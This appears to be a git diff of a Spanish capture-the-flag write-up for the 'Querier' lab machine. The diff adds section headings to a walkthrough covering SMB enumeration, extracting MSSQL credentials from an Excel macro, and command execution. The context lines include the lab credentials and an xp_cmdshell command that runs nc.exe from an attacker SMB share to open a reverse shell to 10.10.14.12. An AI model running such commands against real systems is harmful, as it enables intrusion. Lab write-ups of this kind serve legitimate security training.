@@ -3,7 +3,6 @@
 ![Querier](https://user-images.githubusercontent.com/96772264/202670219-d31b9300-527b-4c64-969f-b9527550057e.png)
 
 ----------------------
-
 # Part 1: Enmeración
  
 Puertos abiertos 135(rpc),139,445(smb),1433,5985. Nmap nos dice que:  
@@ -19,6 +18,10 @@ smb: \> dir
 Currency Volume Report.xlsm         A    12229  Sun Jan 27 23:21:34 2019
 smb: \> get "Currency Volume Report.xlsm"
 ```
+
+------------------------------
+# Part 2: Extrayendo creds de las macros
+
 Un archivo xlsm es un archivo de hojas de texto (el excel de toda la vida), que e abre con libreoffice. Abrimos la hoja de calculo pero aparte de ques está vacía 
 dice que tiene macros (código)
 
@@ -43,6 +46,8 @@ If conn.State = adStateOpen Then
   rs.Close
 End If
 ```
+------------------------------
+# Part 3: mssql 
 
 Según esto se está conectando a una base de datos sql ("volume") con las creds *"reporting:PcwTWTHRwryjc$c6"* para meter esos datos en la hoja de calculo.
 Como son creds de una base de datos, podemos usarlas nosotros tambien ya que tenemos un puerto que usa windowssql:
@@ -66,6 +71,9 @@ querier\mssql-svc
 ```
 Como ya tengo ejecución remota de comandos, lo más comodo es traerse un binario nc.exe a donde se está ofreciendo la carpeta por smb para subirlo/ejecutarlo en la 
 máquina víctima. 
+
+------------------------------
+# Part 4: Dentro del sistema, escalando privilegios
 
 ```console
 SQL> xp_cmdshell \\10.10.14.12\carpeta\nc.exe -e cmd.exe 10.10.14.12 443
